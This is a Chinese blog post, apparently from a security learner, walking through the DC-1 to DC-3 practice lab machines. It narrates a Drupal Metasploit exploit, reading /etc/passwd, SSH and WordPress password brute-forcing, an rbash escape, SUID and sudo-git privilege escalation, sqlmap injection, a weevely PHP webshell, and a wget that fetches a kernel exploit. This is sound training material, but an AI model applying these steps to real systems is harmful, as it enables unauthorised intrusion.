@@ -1,0 +1,268 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>DC1-3靶机渗透实战与经验小结 | ghtwf01</title><meta name="author" content="ghtwf01"><meta name="copyright" content="ghtwf01"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言：DC类靶机是比较入门的一类靶机，适合没有打过靶机或者经验不丰富的朋友玩，每一个靶机打下来都会get新姿势下载链接:http:&#x2F;&#x2F;www.five86.com&#x2F;DC-1渗透过程: nmap全扫存活主机及端口 nmap -sV 192.168.1.1&#x2F;24  进入靶机80端口的网站，发现是drupal cms，用御剑或者dirb扫描网站目录没有发现有敏感文件，于是使用msf查找该cms">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC1-3靶机渗透实战与经验小结">
+<meta property="og:url" content="https://www.ghtwf01.com/2019/10/07/DC1-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8E%E7%BB%8F%E9%AA%8C%E5%B0%8F%E7%BB%93/index.html">
+<meta property="og:site_name" content="ghtwf01">
+<meta property="og:description" content="前言：DC类靶机是比较入门的一类靶机，适合没有打过靶机或者经验不丰富的朋友玩，每一个靶机打下来都会get新姿势下载链接:http:&#x2F;&#x2F;www.five86.com&#x2F;DC-1渗透过程: nmap全扫存活主机及端口 nmap -sV 192.168.1.1&#x2F;24  进入靶机80端口的网站，发现是drupal cms，用御剑或者dirb扫描网站目录没有发现有敏感文件，于是使用msf查找该cms">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.ghtwf01.cn/img/avatar.jpg">
+<meta property="article:published_time" content="2019-10-07T04:53:43.000Z">
+<meta property="article:modified_time" content="2023-05-10T14:51:18.160Z">
+<meta property="article:author" content="ghtwf01">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.ghtwf01.cn/img/avatar.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://www.ghtwf01.com/2019/10/07/DC1-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8E%E7%BB%8F%E9%AA%8C%E5%B0%8F%E7%BB%93/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'DC1-3靶机渗透实战与经验小结',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-05-10 22:51:18'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://www.ghtwf01.cn/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">42</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="ghtwf01"><span class="site-name">ghtwf01</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">DC1-3靶机渗透实战与经验小结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-10-07T04:53:43.000Z" title="发表于 2019-10-07 12:53:43">2019-10-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-10T14:51:18.160Z" title="更新于 2023-05-10 22:51:18">2023-05-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/">攻防技术</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="DC1-3靶机渗透实战与经验小结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><strong>前言：</strong><br>DC类靶机是比较入门的一类靶机，适合没有打过靶机或者经验不丰富的朋友玩，每一个靶机打下来都会get新姿势<br><strong>下载链接:</strong><br><a target="_blank" rel="noopener" href="http://www.five86.com/">http://www.five86.com/</a><br><strong>DC-1渗透过程:</strong></p>
+<p>nmap全扫存活主机及端口 nmap -sV 192.168.1.1&#x2F;24</p>
+<p><img src="http://127.0.0.1:4000/img/20191007114518-e135afce-e8b4-1.png"></p>
+<p>进入靶机80端口的网站，发现是drupal cms，用御剑或者dirb扫描网站目录没有发现有敏感文件，于是使用msf查找该cms有哪些可利用的漏洞</p>
+<p><img src="http://127.0.0.1:4000/img/20191007114529-e7aeb134-e8b4-1.png"></p>
+<p>发现2018年那个漏洞可以直接利用，连接成功</p>
+<p><img src="http://127.0.0.1:4000/img/20191007114540-ee4a8c34-e8b4-1.png"></p>
+<p>进入shell，查看目录发现flag1.txt，打开</p>
+<p><img src="http://127.0.0.1:4000/img/20191007114551-f54c68a4-e8b4-1.png"></p>
+<p>提示信息说每个cms都有一个配置文件，于是猜测第二个flag藏在配置文件里面，最后在&#x2F;var&#x2F;www&#x2F;sites&#x2F;default&#x2F;settings.php里面找到flag2.txt<br>查看flag2.txt发现里面有数据库的各种信息</p>
+<p><img src="http://127.0.0.1:4000/img/20191007114607-fea4df3a-e8b4-1.png"></p>
+<p>得到信息后连接mysql数据库，发现连接不上，于是暂时搁置换一个思路<br>linux下有两个存放密码的路径，&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow<br>二者的详细介绍参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/yaofeino1/article/details/54616440">https://blog.csdn.net/yaofeino1/article/details/54616440</a><br>于是查看&#x2F;etc&#x2F;passwd</p>
+<p><img src="http://127.0.0.1:4000/img/20191007114926-751c5026-e8b5-1.png"></p>
+<p>发现有一个flag4用户，于是使用hydra和john the Ripper爆破，hydra是kali自带，只需要下载john the Ripper<br>下载：wget <a target="_blank" rel="noopener" href="http://www.openwall.com/john/j/john-1.8.0.tar.gz">http://www.openwall.com/john/j/john-1.8.0.tar.gz</a><br>解压：tar -xvf john-1.8.0.tar.gz<br>然后开始爆破ssh，爆破出密码为orange</p>
+<p><img src="http://127.0.0.1:4000/img/20191007114950-83980d0c-e8b5-1.png"></p>
+<p>于是连接ssh，在当前目录找到flag4.txt，查看</p>
+<p><img src="http://127.0.0.1:4000/img/20191007115004-8be98b34-e8b5-1.png"></p>
+<p>大致意思是让我在root目录里面找flag<br>想到之前有了数据库账号密码，于是在这里登陆一下。之前那个网页不知道账号密码，所以准备在数据库里面修改管理员密码</p>
+<p><img src="http://127.0.0.1:4000/img/20191007115111-b3da9f98-e8b5-1.png"></p>
+<p>发现users表，然后查看里面的数据</p>
+<p><img src="http://127.0.0.1:4000/img/20191007115127-bd7b0ab0-e8b5-1.png"></p>
+<p>发现里面的密码是通过某种加密方式加密的，在搜索引擎上面查一下drupal cms怎么在数据库修改密码，在网上找到如下一句话<br>![](<a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.c/">https://xzfile.aliyuncs.c</a><br>om&#x2F;media&#x2F;upload&#x2F;picture&#x2F;20191007115157-cf4595d0-e8b5-1.png)<br>于是开始修改admin的密码，修改成功<br><img src="http://127.0.0.1:4000/img/20191007115209-d681d430-e8b5-1.png"></p>
+<p>然后登陆得到flag3</p>
+<p><img src="http://127.0.0.1:4000/img/20191007115221-dd924430-e8b5-1.png"></p>
+<p>这个提示是采用find中的perm(按权限模式查找)来得到下一个flag，根据flag4提示信息进入root知道这里需要suid提权<br>suid提权详解：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/84872644">https://blog.csdn.net/qq_36119192/article/details/84872644</a><br>使用find命令查找所有拥有该权限的文件</p>
+<p><img src="http://127.0.0.1:4000/img/20191007115303-f6aa78de-e8b5-1.png"></p>
+<p>查看一下，发现&#x2F;usr&#x2F;bin&#x2F;find是拥有root权限的文件<br><img src="http://127.0.0.1:4000/img/20191007120852-2bff4008-e8b8-1.png"></p>
+<p>然后提权</p>
+<p><img src="http://127.0.0.1:4000/img/20191007120903-32f7ccfe-e8b8-1.png"></p>
+<p>靶机上面装有python环境，所以也可以运行python代码反弹shell提权</p>
+<p>最后在root目录找到thefinalflag.txt，游戏结束</p>
+<p><img src="http://127.0.0.1:4000/img/20191007120926-40a7e3d4-e8b8-1.png"></p>
+<p><strong>DC-2渗透过程：</strong></p>
+<p>先扫网段内存活主机，发现192.168.1.41是靶机ip<br><img src="http://127.0.0.1:4000/img/20191007121149-95f421a4-e8b8-1.png"></p>
+<p>扫描靶机所有开放的端口</p>
+<p><img src="http://127.0.0.1:4000/img/20191007121159-9b9f7a40-e8b8-1.png"></p>
+<p>然后访问80端口的服务，这里根据靶机下载页面上面的提示需要设置hosts文件</p>
+<p><img src="http://127.0.0.1:4000/img/20191007121207-a045817a-e8b8-1.png"></p>
+<p>访问页面是一个wordpess，找到flag1<br><img src="http://127.0.0.1:4000/img/20191007121214-a4b74680-e8b8-1.png"></p>
+<p>它提示登录找到下一个flag，也提示了cewl，于是就用cewl爬一波密码出来，保存在根目录</p>
+<p><img src="http://127.0.0.1:4000/img/20191007121226-abde3482-e8b8-1.png"></p>
+<p>然后用专门针对wordpress的工具wpscan来扫描所有用户名wpscan –url <a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2</a> –enumerate u   (这一步可以不做，直接跳下一步)</p>
+<p><img src="http://127.0.0.1:4000/img/20191007121241-b4f58228-e8b8-1.png"></p>
+<p>然后用之前得到的密码来爆破 wpscan –url <a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2</a> -P password.txt  得到jerry和tom的密码</p>
+<p><img src="http://127.0.0.1:4000/img/20191007121303-c1dce6d4-e8b8-1.png"></p>
+<p>因为我博客用的wordpress，所以知道后台是wp-admin，不知道也可以用dirb扫出来</p>
+<p><img src="http://127.0.0.1:4000/img/20191007121311-c68c3388-e8b8-1.png"></p>
+<p>两个账号都登陆一下，发现jerry里面有flag2，tom里面没有什么重要信息</p>
+<p><img src="http://127.0.0.1:4000/img/20191007121322-cce7b518-e8b8-1.png"></p>
+<p>想到之前扫描端口的时候ssh端口开放着，用这两个账号连一下ssh试试，先试试jerry账号，发现密码不是wordpress的登录密码</p>
+<p>再试试tom，发现能登录进去，但是这是rbash限制了很多命令</p>
+<p><img src="http://127.0.0.1:4000/img/20191007121343-d9bd7264-e8b8-1.png"></p>
+<p>这里可以使用vi来查看flag3.txt</p>
+<p>但是我们的思路肯定是要切换到另外一个用户，里面可能有flag，命令被限制肯定不行</p>
+<p>于是我们执行如下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a//切换shell</span><br><span class="line"></span><br><span class="line">export PATH=$PATH:/bin/  /cat等命令存放在这里面</span><br><span class="line"></span><br><span class="line">export PATH=$PATH:/usr/bin/  /sudo等命令存放在这里面</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://127.0.0.1:4000/img/20191007121523-15903588-e8b9-1.png"></p>
+<p>然后就可以查看flag3.txt了，因为之前用vi编辑器不小心把flag3.txt里面的内容删了，所以就不截图出来了，里面的意思是切换到jerry用户，于是切换到jerry，密码就是wordpress那个密码<br><img src="http://127.0.0.1:4000/img/20191007121544-21fa435e-e8b9-1.png"></p>
+<p>因为切换后还是在tom这个用户的目录，所以没有权限查看，于是切换到jerry目录，找到flag4，里面的意思是让我们用git提权</p>
+<p><img src="http://127.0.0.1:4000/img/20191007121608-301a46f0-e8b9-1.png"></p>
+<p>用sudo -l 查询一下当前的权限</p>
+<p><img src="http://127.0.0.1:4000/img/20191007121624-39c41a6e-e8b9-1.png"></p>
+<p>有git权限</p>
+<p>git有一个缓冲区溢出漏洞，在使用sudo git -p –help时，不需要输入root密码即可以root权限执行这条命令，于是我们直接在这时候打开bash shell，直接提权至root，在root目录下找到final-flag.txt</p>
+<p><img src="http://127.0.0.1:4000/img/20191007121633-3f2accd2-e8b9-1.png"><br><strong>DC-3渗透过程：</strong></p>
+<p>先老规矩nmap扫描存活主机</p>
+<p><img src="http://127.0.0.1:4000/img/20191007121904-991f38a4-e8b9-1.png"></p>
+<p>再扫描靶机端口</p>
+<p><img src="http://127.0.0.1:4000/img/20191007121915-9fcd7d64-e8b9-1.png"></p>
+<p>访问一下页面，然后用dirb扫描一下目录得到登录界面administrator，是Joomla建站系统</p>
+<p>于是用joolscan扫描一下网站，得到Joomla版本</p>
+<p><img src="http://127.0.0.1:4000/img/20191007121932-a9c6adfe-e8b9-1.png"></p>
+<p>在sploitsearch中搜索一下有不有现成的漏洞可以利用，发现有一个SQL注入漏洞</p>
+<p><img src="http://127.0.0.1:4000/img/20191007121943-b01a67cc-e8b9-1.png"></p>
+<p>查看一下漏洞详细，直接用sqlmap跑，成功</p>
+<p><img src="http://127.0.0.1:4000/img/20191007122005-bd390404-e8b9-1.png"></p>
+<p>最后在joomladb数据库#__users表里面查看到账号密码</p>
+<p><img src="http://127.0.0.1:4000/img/20191007122047-d699b4d4-e8b9-1.png"></p>
+<p>用john暴力破解得到明文密码snoopy</p>
+<p><img src="http://127.0.0.1:4000/img/20191007122109-e3a6469c-e8b9-1.png"></p>
+<p>于是登录进后台，发现可以修改网页源代码</p>
+<p><img src="http://127.0.0.1:4000/img/20191007122122-eb228750-e8b9-1.png"></p>
+<p>于是用weevely生成php后门文件</p>
+<p><img src="http://127.0.0.1:4000/img/20191007122131-f0e928b0-e8b9-1.png"></p>
+<p>复制代码新建webshell.php文件，粘贴代码，保存</p>
+<p>然后用weevely连，成功拿到shell</p>
+<p><img src="http://127.0.0.1:4000/img/20191007122140-f641cfd8-e8b9-1.png"></p>
+<p>查看当前内核版本</p>
+<p><img src="http://127.0.0.1:4000/img/20191007122150-fbe0aa54-e8b9-1.png"></p>
+<p>在网上搜索了一下，这是Ubuntu 16.04版本</p>
+<p><img src="http://127.0.0.1:4000/img/20191007122159-01784b70-e8ba-1.png"></p>
+<p>在searchsploit里面搜索一下这个版本有哪些漏洞</p>
+<p><img src="http://127.0.0.1:4000/img/20191007122211-0851fe1e-e8ba-1.png"></p>
+<p>发现有个’double-fdput()’ bpf(BPF_PROG_LOAD)提权漏洞，于是查看一下</p>
+<p>根据链接下载攻击脚本到tmp目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip /tmp</span><br></pre></td></tr></table></figure>
+
+<p>然后一系列解压运行</p>
+<p><img src="http://127.0.0.1:4000/img/20191007122232-1512d6e6-e8ba-1.png"></p>
+<p>最后一步</p>
+<p><img src="http://127.0.0.1:4000/img/20191007122254-220eb93c-e8ba-1.png"></p>
+<p>提权失败，网上找了一下，说用-o nonempty可以解决mountpoint报错，然而还是不行，system() failed是什么操作，求助师傅们</p>
+<p>小结：<br>通过这三个靶机学到了针对特定cms的扫描工具wpscan和joomscan，以及cewl、weevely的使用，还有可以爆破密码和hash的john，破解hash还可以使用hashcat，学到了git提权、suid提权以及逃离rbash方法，重中之重是深刻理解了利用searchsploit和msf下的search的作用，作为一个新手，利用现成的漏洞会节约很多的时间，这样效率就会高很多</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://www.ghtwf01.com">ghtwf01</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.ghtwf01.com/2019/10/07/DC1-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8E%E7%BB%8F%E9%AA%8C%E5%B0%8F%E7%BB%93/">https://www.ghtwf01.com/2019/10/07/DC1-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E4%B8%8E%E7%BB%8F%E9%AA%8C%E5%B0%8F%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.ghtwf01.com" target="_blank">ghtwf01</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://www.ghtwf01.cn/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2019/10/24/CVE-2018-12613%20phpMyAdmin%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="CVE-2018-12613 phpMyAdmin远程文件包含漏洞分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CVE-2018-12613 phpMyAdmin远程文件包含漏洞分析</div></div></a></div><div class="next-post pull-right"><a href="/2019/09/18/%E5%88%A9%E7%94%A8badusb%E5%AF%B9%E7%94%A8%E6%88%B7%E8%BF%9B%E8%A1%8C%E6%9C%A8%E9%A9%AC%E8%BF%9C%E6%8E%A7/" title="利用badusb对用户进行木马远控"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">利用badusb对用户进行木马远控</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://www.ghtwf01.cn/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ghtwf01</div><div class="author-info__description">山不向我走来，我便向它走去</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">42</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ghtwf01"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/09/KMS-%E4%BA%91%E6%97%B6%E4%BB%A3%E4%B8%8B%E7%9A%84%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1/" title="KMS-云时代下的密钥管理服务">KMS-云时代下的密钥管理服务</a><time datetime="2023-05-09T04:53:43.000Z" title="发表于 2023-05-09 12:53:43">2023-05-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/11/07/excavator%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8Emitmproxy%E7%9A%84%E6%8F%92%E4%BB%B6%E5%BC%8F%E8%A2%AB%E5%8A%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8/" title="excavator——基于mitmproxy的插件式被动安全漏洞扫描器">excavator——基于mitmproxy的插件式被动安全漏洞扫描器</a><time datetime="2022-11-07T04:53:43.000Z" title="发表于 2022-11-07 12:53:43">2022-11-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/09/24/%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E5%9F%9F%E6%B8%97%E9%80%8F%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="三层网络域渗透打靶记录">三层网络域渗透打靶记录</a><time datetime="2022-09-24T05:53:43.000Z" title="发表于 2022-09-24 13:53:43">2022-09-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/16/HackTheBox%E5%9F%9F%E7%B3%BB%E5%88%97%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%94Forest/" title="HackTheBox域系列打靶记录——Forest">HackTheBox域系列打靶记录——Forest</a><time datetime="2022-03-16T04:53:43.000Z" title="发表于 2022-03-16 12:53:43">2022-03-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/01/18/Kubernetes%E5%A4%A7%E5%9E%8B%E5%88%86%E5%B8%83%E5%BC%8F%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%B0%8F%E8%AE%B0/" title="Kubernetes大型分布式集群环境搭建小记">Kubernetes大型分布式集群环境搭建小记</a><time datetime="2022-01-18T05:53:43.000Z" title="发表于 2022-01-18 13:53:43">2022-01-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By ghtwf01</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
